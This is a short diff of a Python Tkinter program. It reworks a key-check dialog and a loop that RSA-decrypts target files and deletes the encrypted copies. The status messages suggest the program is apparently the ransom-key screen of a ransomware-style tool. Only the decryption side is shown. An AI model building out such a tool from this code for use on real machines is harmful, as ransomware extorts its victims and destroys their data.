@@ -253,12 +253,14 @@ class MyTk:
 
         self.l_input.config(text=" The keys are being checked ... ")
         self.pwbutton.config(state='disabled')
+        #self.pwbutton['state'] = 'disabled'
 
-        self.parent and self.parent.checkPassword(self.pw)
+        if(self.parent and self.parent.checkPassword(self.pw)):
+            self.finalGui()
+        else:
+            self.pwbutton.config(state='normal')
+            self.l_input.config(text=" It's the wrong key.")
 
-        self.pwbutton.config(state='normal')
-        self.pwbutton['state'] = 'normal'
-        self.l_input.config(text=" It's the wrong key.")
 
     def finalGui(self):
         print("디버깅1")
@@ -461,8 +463,7 @@ class RealMain:
                     for dec_target in dec_targetlist:
                         dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                         os.remove(dec_target)
-                    self.myGui.finalGui()
-
+                    return True
 
 if __name__ == "__main__":
     for i in range(10):
